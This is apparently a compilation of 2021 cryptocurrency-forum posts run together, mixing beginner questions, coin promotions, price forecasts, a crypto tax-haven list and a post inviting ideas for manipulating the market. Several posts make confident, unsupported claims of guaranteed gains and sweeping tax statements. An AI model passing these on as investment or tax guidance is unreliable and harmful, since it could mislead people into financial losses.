dYdX is a decentralized exchange that allows users to leverage trade via Ethereum which also partnered with StarkWare to implement a layer 2 protocol. After implementing layer 2 the exchange exploded hitting nearly $9 billion in volume on the 28th of September. While leverage trading can be scary, it pretty amazing to be able to do on a layer 2 decentralized platform. It's got a great UI and worth a shot if you are looking to leverage trade. dYdX is Currently sitting at 129 on coingecko, only 30 or so spots back from loopring, giving it get potential to grow.


2. Rubic

Rubic is a Multi-Chain protocol which allows swaps between 10k tokens on ETH, BSC, Polygon &amp; AVAX and while it doesn't have layer 2 for eth they use polygon as their layer 2 solution. The web app on rubics site helps pick the best route to make a swap for the least fees. With its current marketcap sitting it around 750 on coingecko, this coin had room to jump significantly if adopted by a larger Audience as the rubic token will be used to help with swaps 

3. Stakenet

Stakenet DEX is based on Lightning Network, as it performs instant, practically fee-less, and infinitely scalable Lightning Swaps. Stakenet is an interesting one, it was in open beta last year and then had been in closed beta for most of this year, just recently announcing the release date for December 10th. Stakenet is a bit different as it uses both the lightning network for Bitcoin and layer 2 for Ethereum for swaps. There was a recent twitter video [here](https://mobile.twitter.com/velocryptator/status/1455657180825362440) that showed it off. Sitting at #920 on coingecko it is definitely on the higher side, but if the release in December is legit it has the potential to skyrocket.


I think layer 2 and lightning are the future of crypto. Loopring, dYdX, rubic, stakenet, polygon and connext are looking to prove that. What do you think? Do you know any other great layer 2 projects, would love to hear them if so! Thanks for reading and have a great day!

Hi guys, girls,

I'm fairly new into this crypto world. My experience so far:

* Started on the 8th of October, after a friend had some good profits on SHIB. She bought it around 0.000006 and turned it to 0.000020 in just two weeks.
* I've invested 4K euro. 1K in SHIB when it was 0.000023 and 3K into some other coins (Solana, Fantom, VeChain etc).
* When SHIB turned into 0.000033 I added another 1K in it and sold 90% of it when it turned 0.000067. Made some good profits on it and I guess I had a lot of luck, as its slowly moving down.
* Then I used that profit to invest in some other coins, dumped some more euro's in the crypto machine and got a total profit now of 5-6k in one month, depending on what day I look at the red and green dildo's.

Now I'm very exited of my profit and consider most of my luck as 'I joined at the right time in the market', even though I read a lot here and check every website of each coin I buy, try to get a feel of the community, follow Twitter accounts etc.

But.... damn... it still feels stressful when everything goes down for like 5%. I guess more people feel that stress? How many times do you guys/girls tell yourself that it will be OK? And do you always believe it when you say it? :)

I've been thinking about this a lot as a developer that's looking for a new gig as part of the Great Resignation (thank you media). I got into Crypto mainly because I saw the potential for its use against fiat and inflation, but the more I looked into the tech and into blockchain, the more I wanted to learn, because I am nothing if not a sponge. Thus began me making my own tiny API for fun to better understand how blockchains work and are generated, how they're verified, point of work, all the good stuff. 

From the start, things began to gnaw at my brain. Blockchain is larger than crypto and it always has been. It has so much potential in arenas outside of it that I've sat up at night thinking of all the ways that we could iterate over them, make our current sectors more secure, stable, and less of a mess than they currently are. Some of the main ones I can think of, and that I've seen talked about and that I'm directly affected by are: 

Insurance and medical fields. Can you imagine blockchain and the power it could have to revolutionize the insurance industry, including pharmacology? No more worrying about fake drugs at the pharmacy, or if you're getting a ritalin that is too strong, or not strong enough, when scanning. Or drug recalls being so much easier ***because of a blockchain***. 

Doctor licenses and medical board information stored on blockchain so they can't hide their stuff, like they currently can. Do you know how hard it can be to find medical complaints against a doctor? 

Pricing drugs out in a fair and equitable manner because it's so much easier to find, because the drug information is stored on a blockchain. 

This is probably something that's been discussed ad nauseum, but as I've been working more and more on my API, and on understanding the tech side of this--as well as finding a job in my favorite field--I keep getting more and more jazzed about it. So, what do y'all think? Of course it will always has a place in crypto! But where do you see it's biggest potential?

I was checking the bitinfocharts and realized that even if you hold 0,1 BTC you are in the top 6% of adress holders, if you hold 0,01 BTC you are in the top 15%, 0,001 BTC gets you into top 24% and lastly anything between 0 and 0,001 BTC lands you in top 51% of adress holders. 

These numbers may vary of course but what you might perceive as a small amount or nothing can still make you a hefty penny. But also, if you happen to be amongst the top 51% of adress holders, remember that this is still early and that you will catch up to whatever crypto related goals you have way before 90% of all people who actually might be too late to grow their capital as you've had the opportunity to do.

As people posted on this subreddit before, you can take advice on how to invest your money from literal kids. (I know a lot of people will start with DYOR but most of us here sometimes fall into the FOMO that is created around here).

So at least to be sure that someone that is "recommending" (aka shilling) you a coin or a token should have to complete a captcha that can verify you are at least an appropriate age. This will take out many of the bots that are automatically responding with their coins.

Be safe and be green!

**Why should we invest in the bag you hodl?**


We all are bag holders, one way or another; some by choice and some due to no other choice.

While some of us have invested in the time tested and more extensive projects like Bitcoin, Ethereum, Cardano etc., others have invested in meme coins like Doge, Shiba etc. 

Some of us are long-term hodlers, while others FOMO into every new coin expecting 5x. 10x etc., gains in return.

Every one of us has our reasons for holding a particular coin or token.

It's time to convince us, why should we invest in the bag you hodl?

Is your bag a good investment strategy or just another bag?

We keep preaching about "crypto becoming mainstream" yet I barely see anyone standing up to these big swapping platforms about the quality of coins they list. 

It's really not a hard job to do. There are much smaller platforms like ChilliSwap that have an Al that uses certain algorithms to monitor listed projects and pick out the scams before its too late. So what's stopping the major swaps from doing the same? l'll tell you what. profit. It's simply more profitable for them to keep it that way.

Is KRL or Kryll coin a good investment?

They only have 38 million coins in circulation with a cheap market cap of 100 million. Seems like a sleeping giant to me. Coins like SOL have 300 million coin supplies yet are worth hundreds of dollars. Out of all the shitcoins, Kryll seems to be one of the few that doesnt have an over inflated supply. Maybe Im wrong, but if theres less coin it should be worth more? 

The chart is on an uptrend because it was just listed on Coinbase. A lot of times these newly listed coins run for a few days. With this also being a low floater I think it has potential to run far higher. 

The chart has a very bullish pattern and if the trend continues it could go parabolic. 

Maybe Im wrong, what do you guys think?

i hate working from 9-5 every day only to spend 2 hours sobering up on the couch after being stuck in traffic for hours, knowing that this will continue for the next few years. 

To be clear I don't hate working but I would rather do something that I might like better but pays less. After being a lurker in this forum for a few years I decided to get more involved with crypto. And I must say I have not regretted a single second! Unfortunately, I do not know many people in my environment who know about crypto and even if only smile. The people here in the forum have shown me new ways to invest my money. And for this pinch of hopium I am thankful to all of you who take the time here to bring people like me closer to the world of crypto. Maybe I'll manage to live like this someday. Until then all the best and thanks for listening!

So I recently got interested in crypto after seeing Facebook blow up about Shiba going up. I've never really looked into this all that much so I'm new to all of this. Does anyone have any suggestions for first buys that seem to do well? I'm not expecting to get rich off of this but I thought this might be something for me to generate a little extra cash here and there. Any other resources I could dig into to learn more about this would be great too. I could use all the help I can get so that I can make this a successful venture. Thank you all for your time.

As mentioned in the title, I want you guys to ask me any random questions you got about Cryptocurrencies and after I have answered it, you can edit your original comment to make my response look funny/stupid/ridiculous afterwards.

Feel free to ask whatever you want. I am really curious what you want to know from a ~~completely moron~~ crypto mastermind like me. Being fully invested in great coins like ~~SQUID, SHIBA, DOGE~~ BTC, ETH, ADA I surely can help you with anything. See you in the comment section.

Hello guys,
I'm also a Hodler of SHIB, but I also invest in other coins. 

Did someone get into Bonusfloki lately? (Only 2 days on the market though)
I bought 3.484.000.000 (3.48B) coins for approx 36. I got them in Metamask and noted them in e.g. CoinMarketCap to track my earnings. Now I looked into the wallet and now I'm standing here with 178.000.000 (178M) Bonusfloki and a value of about 0,2 BNB / 1. If I try to swap at PancakeSwap, I also shows only tje 178M!

Welp!

Okay, now I look into BSCscan and I see, that I have a quantity of 3.4 B Coins with a balance of 178 M?? Can someone explain this to me?

There are no transactions in my wallet that show me a transfer of Bonusfloki to anyone. What I noticed too, the number in my wallet changes from time to time. Sometimes I get 180M, now I have 166M. But no transactions. If I only only have these Millions, that's a real scam in my opinion, because I paid 40 including fees and now I only have 1.

Bought them to hodl! Not for quick money. 

Thanks!!

This post is aimed at the people who haven't brought because they can not afford, 1 BTC or 1 ETH or are still wondering about buying.

I am seeing comments daily about: is it worth only buying a fraction of a coin? not seen a post like this so thought I would. 

I have been in crypto since 2017 but I was on min wage at this time. I only had about 100 per month to spend on myself, I put between 10-50 in every month buying little fractions here and there and eventually I had .04 BTC and .2 ETH as well as a load of alts. This year my investment jumped a hell of a lot and my measly 500 total investment over 3 years was worth a lot more. I didn't care I did not own a whole ETH or BTC I just was happy I was still in for the ride. 

Now one small piece of advice (this is just an idiot sharing his experience don't take it to heart but if one person learns and doesn't lose due to this I will be happy) 

The above is a shorter version of what happened over time one thing I left out was I tried to trade a bit for a little profit and last year I had actually accumulated 2  ETH at a total cost of about 400. when ETH started to jump I saw my opportunity to sell at quite a large gain to buy back in on the next dip. I sold it all at roughly 800 and then over then next week or two watched it smash 1000 and then 1500. I brought back in after taking out my original investment and this is why I only own .3 now but I do not regret what I did I have learnt from it buy hold and DCA. Now I have a goal once I hit this goal I will sell what I need to and then just hold the rest for a hopeful early retirement while I DCA till then. My current goal is to be able to have enough to buy a house its not a lot I know and many people are here in there life already, especially cos I'm nearly 40 but crypto has opened this door for me that NEVER would have been there without it. 

Time in the market not timing the market but if you can by all means do. I can not and was just a little lucky and then very unlucky but that's just me lol.

Happy buying all hope you have a great week.

## 1. Portugal

There are no taxes for cryptocurrency investors in Portugal. Also no capital gains tax or VAT levied for crypto transactions. You will also get a golden visa if you invest +250k  in businesses or buy a house for 280k in rural areas, there are also startup or tech visa routes.

Portugal is the tax heaven for crypto investors and the deserved first place on my list.

## 2. Malta

Malta is also tax free for crypto investors and exempts capital gains tax and VAT and has implemented several crypto friendly virtual currency  legislations. Several companies like Revolut, OKex, Nchain, Binance  are established crypto firms in Malta.

Malta will give you golden visa with permanent residency  for paying a fee of about 100k $ to the government. Citizenship is also possible after one year if you invest about one million euro.

This payed citizenship isn't as easy as in Portugal, but makes a nice second place.

## 3. Germany

Germany has no taxes for crypto and virtual currencies if you hold them for one year or more. These assets are classified as private  money. VAT is exempted. 

They even had this rule for stock until 2020 when the withholding tax was indtroduced after heavy pressure from the rest of the EU. Businesses however have to pay corporate income  taxes.

Germany will give you a business visa or residency if you invest at least 100K euros in a venture with active investment.

For natural hodlers, Germany can be a ctypto heaven and is, compared to the quality of life in gerneral a great place for crypto enthusiasts.  

## 6. Singapore

Capital gains tax does not exist in Singapore, so neither individuals nor corporations holding cryptocurrency are liable.

But companies based in Singapore are liable to income tax, if their core business is cryptocurrency trading, or if they accept cryptocurrency as payment.

The authorities consider payment tokens  such as Bitcoin to be intangible property rather than legal tender,  and payment in the cryptocurrency constitutes a barter trade where the  goods and services are taxed, but not the payment token itself.

## 7. Malaysia

Malaysia does also not have a capital gain tax, cryptocurrencies are tax free. 

Virtual currencies not a legal tender in Malaysia. The tax treatment will change if they are accepted legal tender. Foreign sourced  income is also not taxable in Malaysia.

## 10. Australia

In Australia, to acquire cryptocurrency as an investment, you may have to pay tax  on any capital gain you make on disposal of the cryptocurrency. Records  must be kept for all transactions involving crypto assets.

Capital gains tax apply for selling, gifting, trading, converting and  using to obtain goods or services. It is added to the assessed income.  Some capital gains or losses that arise from the disposal of a  cryptocurrency that is a personal use asset may be disregarded.

Australia is offers a number of business innovation visas for the purpose of investing in Australia.

## 11. Cyprus

Profits from trading cryptocurrencies are not taxed in Cyprus. VAT is  also exempted. Cyprus has the lowest corporate income taxes in the EU  (12.5%)

Cyprus will give you resident visa if you buy a real estate for 300K  and there is also a startup visa route. If could could afford little  over 2 million euros, citizenship in six months is also a possibility  through Cyprus investment scheme.

## 12. Greece

Greece taxes 15% on capital gains arising from cryptocurrency  transactions. There is no regulatory framework for bitcoin or  cryptocurrencies in Greece.

Hey guys, beginner here. Still trying to learn the ins and outs of everything. From my understanding, when sending coins from one wallet to another you need to use the same network that the coin runs on right? I want to withdraw an erc20 token from Kucoin to my trezor, but the only option under network is BEP20 (BSC). I read that it is compatible with the trezor, but figured Id ask first, if I transfer my erc20 coins to my trezor using this network will it successfully go through or be lost in space forever? Thank you!

We know that the market always goes up, or at least this is what the Wallstreetbets degenerate would say. It is reasonable that the mean of the top coins would go constantly up giving a 99% chance of gains without using a single brain cell.

Why is that, in your humble opinion, we are not getting the equivalent of the S&amp;P 500 for cryptos?

Let's say you are the mysterious 8 billions SHIB holder. Your one goal is to take some profit, whilst also taking the entire crypto market down with you.

What could you do to cause as many coins as possible to dip like they've never dipped before, or to rise to such extremes that nobody knows what is happening.

Could you manipulate enough of the crypto market for your own gain? Take down as many meme coins with you as possible? Make SHIB the one true coin?

You have a lot of power holding 8 billion of crypto and as they say, with great power comes great potential to cause tremendous collateral damage.

What's your battle plan?

You'll have people screaming hodl

Those shouting sell we're all going to die

Many suggestions to take profit

Others saying accumulate

You can almost guarantee 50% or more of them have at least once done the opposite to what they're preaching. That's because ultimately crypto and defi can be a pretty mental place and everyone has what works for them, what money will make a difference, tolerance on loss or late realisations that they've overstretched or are under exposed.

When it comes to the crunch, do what works for you. You have no obligation to everyone else as they do not to you. Don't stress yourself out.

Ps....... Hodl

See below for the original post. This story does not end well

Unfortunately not long after posting that I had a chain of unexpected expenses hit me. Rather than sell the parts of my portfolio that I believe in, I planned to give up on this experiment and sell the 100 Id put into the coins

Turns out, I cant, not without losing most of it to fees. Some of the coins were up by a few  in value, but when going to sell UCH, currently valued at 18.30, I would only receive 7.80! Similar story for all of them, so long story short I did this for you guys, but it was a failure. Im sorry 

ORIGINAL POST:-

Inspired by a recent post, I bought the 5 lowest ranked coins on Crypto.com

As the title says, I saw a post about buying the lowest ranked coin - Boge?. Well thats not available to me on the Crypto app, so I thought Id put 20 into each of the bottom 5 and see what happens 

Now firstly, I chose the bottom 5 of the large cap rankings, and only the ones that Crypto.com lets you buy, there are many listed that arent available

Here they are-

DeRace - a complete NFT horse racing ecosytem. ATH 3.14 Currently 2.19

S.C. Corinthians Fan Token - allows S.C. Corinthians fans to have a tokenised share of influence on club decisions. ATH  2.81 Currently 0.95

Argentine Football Association Token - allows Argentina national football club fans to have a tokenised share of influence on club decisions. ATH 4.69 Currently 1.53

OG Fan Token - No info. ATH 16.75 Currently 4.75

Universidad De Chile Token - No Info, but I imagine a tokenised shares of influence on club decisions for fans. ATH 111.75 Currently 1.95

All of these are a fair way from their ATHs, so either I might make some good money or theyre dying and Ive lost my money. But rather me than you right?

EDIT: Sorry for the ! I know most users are using dollars but you get the gist

10. Market Cap: SLT Market Cap is only 41 million. There is alot of room for growth.   

9. Max Supply: There are only 7.2 million coins. This is extremely small compared to other cryptos.   

8. Tokenizing Real World Assets: The Smartlands Platform is currently in Beta and will be released for retail in the near future. Currently, there are 4 commercial properties that are being tokenized and are being marketed towards HNWI's (High Net Worth Individuals).    

7. Tier 1 Exchange Coming: The SLT token has only been available on lesser known exchanges and so it has flown under the radar. The team has said they will be putting it on a Tier 1 exchange in the future.    

6. Tokenomics: Smartlands will receive listing fees and revenues from users of the platform. 33% of these revenues received will be automatically used to purchase SLT at market price, and it will be paid back via SLT to users who have there coins staked. This will cause an upwards buy pressure, and also make SLT even more scarce.      

5. Staking Rewards Coming Soon: The staking has already started, and the first payouts are scheduled for December. 33% of the fees received will be payed out via SLT to qualifying (1000 euro minimum) users who have there coins staked.    

4. Liechtenstein: The Blockchain Act helps provide the regulatory framework and government backing to operate. This region is very crypto friendly and are very supportive of this disruptive technology.   

3. Stellar Network: The Stellar network is extremely fast and efficient in comparison to Ethereum and others. Transactions on the Stellar network are almost instantaneous and cost a fraction of a penny to perform. Stellar is also undergoing their Protocol 18 update any day now, this will add automated Market Makers to their Dex which will provide much needed liquidity.   

2. Passive Income Even In A Bear Market: I love a good bull like the rest of us, but past cycles tell us we can't keep going up forever and eventually the market will enter a bear stage at some point. SLT will provide a steady revenue stream from staking and will be a great way to diversify and balance your portfolio for the inevitable future.    

1. Price Potential: I know we are all here for the tech , but let's not kid ourselves. We are here to make lots of money. SLT has been flying under the radar, but now with everything coming together and all the reasons listed above this coin has some serious moonshot potential. This coin can easily soar past $100+ if you compare its market cap with other projects.   

TLDR; Smartlands is a platform that can be used to tokenize assets on the blockchain. SLT is the utility token needed in order to use the platform. I am also a proud bagholder and a big believer in this project.

Some call him crazy, some call him smart. I am not a guy checking YT crypto influencers, nor I use twitter/telegram/discord.

But since I like common sense, sarcasm and simple insights I check TechLead videos once in a while. Accept a bit of weirdness and its fun to watch.

This latest video jumps into some recent events around scams, hyped coins and clearly explains the things happening behind the curtains.

Not sure how skilled dev he is or whats his actual background, but from a rookie tech point of view he makes things a bit more clear for me.

Apologies if its a double post.

https://youtu.be/zkBQF9QJLHY

Have fun watching and have a great crypto day!

Facebook's move towards a "Metaverse" is supposedly the next step in social media. Instead of posting text or images on someone's profile page, you will have an avatar that lives in a virtual space and visits other virtual spaces.

So the question becomes, what kind of virtual space do you want to have, and how will you get it? Will you settle for the basic default space, or pay for a premium? What will be the currency that drives these microtransactions? Do you think there is any chance Facebook will allow an external currency, or are we doomed to use Metacoin?

Let's take it a step further and talk about populating your virtual space beyond the framework. What about all those cool NFT's you've purchased? Maybe you will increase your profile views by putting them on display for others to see. Remember that one-of-a-kind Wutang Clan album? Maybe if you visit my profile, you can listen to a sample from one of the tracks.

You also might be thinking, "I will never pay for these things, they aren't real". Let's be honest though, people have been paying for digital aesthetics since their inception. Avatar skins, emotes, themes, songs, costumes, etc. It's all fair game. Everyone has that one pop culture reference that would make them buckle and spend 3 DOGE.

Anyways, just a theory.

My team and i have developed a new project, we started development almost a year ago and finally launched the community this summer. We now have a few thousand members and are looking to launch in mid-November. However, we are lacking engagement, and our marketing team isn't as effective as we'd want it to be. 

Of course I'm not going to mention the name of the project cause I'm not trying to shill. 

We've been looking for reliable marketing partners everywhere (Fiverr, Upwork, Telegram...) but 99% of them are scammers and 1% are just not reliable. It's become very time consuming and ineffective, so I'm turning to the amazing Reddit for help. 

Where can we source a good marketing team to further develop our community and presence?

Thank you!

# What is it?

MultiVAC (MTV) is a next-generation public blockchain platform designed for large-scale and complicated decentralized applications. With the same node scale, MultiVAC can achieve two orders of magnitude credibility and over **10k TPS**, which will fully meets the needs of large-scale applications. MultiVAC separates transactions and smart contracts/computation and provides an optional slide of CAP for DApps to make their own infrastructure of performance and decentralization level. There will be an economic model and an efficient free market in which Nodes can benefit from bookkeeping, computing and saving, leading to obvious increasing and network effect. The main points of this blockchain are:

* **All-Dimensional Sharding**: MultiVAC breaks through the limitations to blockchain scalability by developing the worlds first fully sharded blockchain with sharded transmission and storage.
* **Blockchain Trilemma Flexibility**: MultiVAC pioneers flexible sharding, allowing DApp developers the flexibility to trade off between the impossible triangle of decentralization, scalability and security.
* **High TPS &amp; Infinite Expansion**: MultiVAC maximizes throughput on every shard while maintaining decentralization and security, allowing decentralized blockchains to achieve industrial capacity

MultiVAC's vision is to enable large-scale commercial DApps to integrate smoothly into our ecosystem, enabling everyone to quickly and easily use blockchain applications to improve their work efficiency and quality of life

**source**: [MultiVAC official site](https://www.mtv.ac/)

# How does it work?

*"MultiVAC is designed for performance and flexibility, pioneering a miner selection model that redefines sharding and smart contracts".* But what is sharding and what are its advantages? Sharding is the only practical and fundamental way to scale blockchain from the bottom up, while at the same time preserving its original intention of being a decentralized ledger open to everyone. It is the deepest level solution that makes the fewest compromises when bringing performance benefits. The other solutions have severe limitations. DPoS violates blockchain's original 'core value' of decentralization by reverting back to semi-centralization. Off-chain solutions such as state channels require trust relationships between the client and the state channel provider. Sharding is the only solution that has been proven to sustainably improve TPS in a decentralized, secure manner. MultiVAC believes that the most robust scaling solutions are built bottom-up from the infrastructural ground level. For this reason, MTV use blockchain sharding as their core scalability approach. The list of the advantages is the following:

* **Linear Scalability To Infinity**: based on fully sharding design, all nodes only need to process the data in their shard, the performance of the whole blockchain network can increase linearly, more shards, higher scalability, it can be infinitely improved.
* **VRF Dynamic Re-Sharding**: on the miner and computing level, MultiVAC pioneers VRF dynamic re-sharding, organic shard splitting, an innovative PoS approach, and others to ensure the shards'security and self-growth capacity.
* **Distributed Storage Scheme based on Merkle Trees**: the ledger is stored in an innovative structure based on Merkel trees. The miner and storage nodes mechanism separates the physical storage and control rights of data which can provide a high level of decentralization and scalability.
* **Fair Mining By Everyone**: lower miner threshold and everyone can join in the network easily. Without any special miner and competition, your laptop or any ordinary PC with dual-core and 2GB RAM can participate in mining.

**source**: [MultiVAC official site](https://www.mtv.ac/)

# Where to store it?

The best hot wallet for MTV are MyEtherWallet, TrustWallet, Atomic Wallet and Exodus. If you want more security, a cold storage like Ledger or Trezor is the right choice.

# Pros&amp;Cons

\*DISCLAIMER\* These lists are subjective, it depends from person to person

**Pros**

1. Wide array of use cases
2. Great devs team
3. High speed transactions
4. Juicy staking feature (16% APY)

**Cons**

1. Its product is still under development
2. Many competitors

I mean, I'm fairly new to crypto in general. Started back in february with the whole doge thing. Stayed and kinda moved into more stable and interesting projects. But now I find myself reading and discovering so many new coins and some of them seem to be really nice and trustworthy projects like NANO, VET, RVN, AUDIO and now LRC

So how do you guys split the money you have available and decide on which coin to invest this week/month? Lets say I have $150 a month to invest. Do you guys go all in 1 coin each time? Or try to put a little bit here and there and slowly grow the overall quantity?

If you're making money right now, it's because you're a GENIUS. You knew exactly which coins were undervalued and were gonna go up, that's why you bought them.

You are the smartest person I know and your bags will keep going up forever, because the coins you picked are so amazing. 

You picked the ETH killer, the Bitcoin killer, the shitcoin that is going to flip Shiba Inu. 

It's important to remind yourself how smart you are for picking exactly the coins that are going up right now. Your coins are still undervalued and will do a 100x. And we're all gonna be rich. (Well, unless you hold XRP, but you're smart so you don't)

**Ps. I probably have to watch out with these posts, because the last time I made a post like this we got a big crash.**

Hello together,

I am new to this whole cryptocurrency game. I was hoping to get some answers in this subreddit. I was scouting some alt coins on CoinMarketCap and found something odd. While looking at the 24h trading volume of CATGIRL, I noticed weird bumps in the diagram. Is this some kind of bug in displaying or does the volume actually change this quickly? If this is correlating with reality how do these form? Why is it such a repetitive pattern? Is this not super easy to trade with? Just buy whenever the trading volume dropped a bunch and wait for it to rise, because logically the price would increase during that time too. I hope some smart people are able to answer my hopefully to too stupid questions...

&amp;#x200B;

Looking for tips to start investing

Hello guys!  I'd like to start investing in tokens, crypto and maybe even better understand NFTs.  I state that I know practically nothing about it.  
How do you advise me to proceed?  Read books, video courses, YouTube channels, Telegram channels, users / pages here on Reddit,?  
I am Italian so if in Italian it is better, but I also understand English well.  Obviously if I consider valid courses / books etc. I am willing to spend some money to learn and invest in myself

Thanks everyone in advance !!

Loopring just went 3X in the past few days and I got ready to FOMO into my very First coin. 
But like always, I decided to research well before putting in my life savings of $200 into a probable gamble. 
Although Loopring is a good( by that I mean non-scam) coin with sound technology, it isn't the only coin doing the L2 thingy in the eth world( please don't judge, I don't know the exact terminology cause I am exhausted). 
So the only reason it went up is because there has been a rumour doing rounds that Loopring is going to partner with the infamous GameStop over an NFT thingy( again, please don't judge).

I checked into the telegram, reddit and website forum channels of Loopring, and DID NOT find any mention of a future collab with GameStop.

Trying to find the base of the rumour, someone mentioned that Loopring's source code had a bit of gamestop code in it. 

So, if the rumour turns out to be false in the next few days the price is going to crash. If it's true, we can expect LRC to be the next hype.

I'd like to get your opinions on this. Also, this post will get deleted soon, please upvote it. I need karmas to start posting and commenting here. Thanks!

In December 2017 and also May this year I witnessed my office go from "what's crypto?" to "should I re-mortgage my house to buy crypto?". I remember in May thinking to myself "oh no... the last time I saw this hype from the muggles was late 2017... best take some profit here to be safe". Now I'm working from home I'm going to have hope I see this hysteria on Facebook or something.

I also have a strict policy now not to get involved in these conversations when such times occur. In late 2017 I thought we were going to the moon like everyone else so was more than happy to help educate others at the office on how to buy and my thoughts on which shitcoin could explode next. They inevitably bought and lost quite a bit and turned that anger towards me. When the May top happened this year I was at a new company and just kept quiet throughout. Lessons had been learnt.

I saw that binance launches DAR in about 20 hours... when i look at the previous launched tokens from binance, they always exploded within the first few minutes and then dropped again to normalize the price.

For example Klaybtc... the first candle was the launch candle. Its the 1 minute timeframe. 

[1 Minute timeframe.](https://preview.redd.it/gy9bc73dkdx71.png?width=517&amp;format=png&amp;auto=webp&amp;s=856c788cc0c2e2e8a1763d8481095f4f1d80df8d)

So within ONE MINUTE, the price exploded and dropped back... it took about 3 weeks before it reached that height again. 

Does it make sense to buy a coin directly at launch ? If so... how do you manage to buy that coin and sell it that quickly to profit from the first candle ?

I was trying to buy a little of the catecoin no shill intended I watched the YouTube videos and read the tutorials. Everything went fine up to the  exchange eth for bnb part. My country pops up on this little notification box and then seems to freeze there and wont let me go any further. The pancake swap doesnt see the ethereum in my wallet since its not the right network and needs to be exchanged to bnb as far as I can tell. Is anyone else running into this same issue and if so how did you get past it? I was trying to hop onboard before the masses do.

Crypto should be no more than 5% of your portfolio according to many articles. Do you guys find that true for your own portfolios? Crypto can be highly volatile but with a little bit of holding and an eye for good projects, your crypto portfolio can run laps around the s&amp;p500. For this reason, I usually invest around 10-15%. Im planning to hold for the long term and dont have much to contribute in the first place, and crypto seems to be the best bang for the buck. Its the future, Im confident, and I almost think it would be more reckless to have anything less than 5% in crypto. But I guess that also depends on how much money you have flowing to diversify in the first place? 

Anyways what are yalls thoughts on 5% max in crypto?

Hi everyone,

Does anyone know if there is a website where I could export prices for coin pairs, for different time intervals. I would like to do some basic analysis and such, however do not want to go through programming a script which does that.

Thanks for any info.

Now Im no crypto OG I only really heard of it in around 2017 and other than using it for silkroad I didnt invest till 2020 but however to answer my own question.

For me it would either be Bitcoin or Dogecoin, I was dabbling in silkroad around 2017 so saw Bitcoin under and around 10k, granted my gains wouldnt of been 1000x but Id of taken 10-63k increase.

With Doge although it was a meme and I would never of held as a serious investment I saw it at around 0.09 before the boom with Elon and would of netted a nice profit had I sold at 0.7.

What about everyone else? I dont think I could live happy having passed on something crazy

We are in the middle of the greatest Crypto Bull Run in history, at least till the next one, where BTC has hit its ATH, ETH hit its ATH yesterday. We are having new unknown coins moon from nowhere every single day while ADA and VET are quietly prodding along.

 As the headline says, I was wondering what you fellow farmers think will be the state of the Crypto universe after this quarter. These are my predictions :

Bitcoin - $77500

ETH - $6200

ADA - $3.25

SOL - $350

DOGE - $0.55

SHIBA - $0.000025

DOT - $100

LINK - $40

I could go on but will stop here.

Where do you guys think we'll be 2 months from now?

**15,549 users** have karma eligible for Moons this round but do not have any Vault address, with a total of **97,352.40 Moons** presently going **unclaimed (lost)**.

&amp;#x200B;

*  MOONs will be distributed at random times, starting from least-to-most moons
* If you don't know how to, you can learn how to open a vault [here](https://www.reddit.com/r/CryptoCurrency/comments/mjwhza/the_greatest_guide_on_how_to_open_secure_your/). Even if you don't have many upvotes, you should definitely open a vault because moons are going to be more scarce in the future. Moons might not be worth much today, but they will definitely be worth a lot in the future as there's great potential for moons to be put on an exchange after which it will be worth a lot in the future.
* You can also grab some free moons from the ***moon faucet*** [here](https://www.moonfaucet.cc/). A moon will most likely be worth way more in the future, so you should definitely stock up! Moreover, you get a 20% bonus each month for holding your moons and 5% bonus for voting on governance polls and 1.25% for each poll you vote after. You shouldn't miss out because ultimately it's free money! Open your vaults, because who doesn't like free moons?!

**MOON Noob?**

1. This must be done from the mobile Reddit app
2. You can give tips using your earned moons by clicking on a users moon count. Go ahead and try it on me!
3. To see your vault address click on the three dots  at the top of your Vault Page
4. Information about what MOONs and vault are/do, please check the [MOONs Reddit Wiki](https://www.reddit.com/r/CryptoCurrency/wiki/moons_wiki/?utm_source=share&amp;utm_medium=ios_app&amp;utm_name=iossmf)

Hi, question as title.

I see a lot of users with more than 10k karma which this month would mean more than 2800 moons, or considering today price, more than 400 USD!

As you probably know I live in Venezuela, where monthly minimum wage is 3 USD and considering some NGO, a 5 members family could "live" with that amount monthly!

But, taking Venezuela out of the question. 400 USD is more than the monthly minimum wage of almost all latin american countries (maybe excluding Panama and Chile!), and this is considering still moons aren't in the mainnet.

This is almost incredible hehehe!

And all 3 things suck. But you can avoid pain and damage from these events by being prepared. 


Price corrections do and will happen, although I'm NOT saying it will be SOON. I'm not trying to be a party pooper here!


Corrections are known to cause stress to crypto fanatics, as they tend to be quite extreme. Losing 25% of your portfolio value in 2 hours hurts and makes you emotional, which in turns leads to irrational decisions. Panic selling is never a good option; most of us have done it, and everyone who did regretted it. 


But how can you prepare for a price correction? 


The answer is simple: take a little profit here and there and make a STABLECOIN BUFFER OF AROUND 20% OF YOUR PORTFOLIO.

This way, a price correction isn't just losing. You now have a sizeable stack, with which you can scoop up some nice deals: you can BUY THE DIP. 


We have all jealously looked at the 'wow ima buy all these discount' - comments. Be one of them. Yes your profit potential is a little less because you have stablecoin, but I can tell you: IT IS WORTH THE PEACE OF MIND.


Buying the dip generally ensures a good buying opportunity. Also, if everyone does this, dips will be less severe as there are more people able to buy these downward price fluctuations. 


If you make your buffer, be mindful of what stablecoin you choose. It is best to choose a fully backed stablecoin and NOT USDT.


Hope you found this useful, even though it doesn't seem all that relevant right now.


TLDR:

-corrections can suck my *ss.

-Holding some STABLECOIN allows you to buy the dip.

-USDT sucks also.

I never deposited more than 100 bucks into my account. Now I'm about to start a big move. My friend whom I can trust told me that there are crypto professionals who analyze different currencies and give people signals to buy and sell on a specific time. I've been watching them and their results for a month now and I clearly saw that 90 percent of the times they are right and the currency they introduced goes like +%30 and that's a good thing to me. Now I'm about to deposit some money and give it a try. Also these professionals never worked for free and we have to pay monthly to use whatever they share. What do you say?

I have invested $320 into crypto and have it spread across 10 different tokens. All of these are what I think of as HODL tokens with good use cases and teams. 

Algo, matic, ach, fet, bat, xlm, amp, xtz, eth, and btc.

In the 3 months since I started investing my $320 has now become worth $380. Not much but it's a start. 

I did invest $15 into the shitcoin Dogelon just in case. But that's not money I consider invested. That's money I considered gambled and already gone. If it comes back great. If not oh well. 

Excluding the Dogelon I have made about a 20% profit. The problem is its spread across 10 different tokens so taking profits just seems silly and unfeasible. 

It does make me feel a little more comfortable investing larger sums. I wanted to dip my toes into crypto and see how i did before throwing money at it comfortably. I will probably wait another 3 to 6 months before upping my investments. Just to see if I'm doing this right or not. 

Cautious. I may miss a few boats doing it this way. I certainly won't get rich off my $320, but I'm learning a lot.

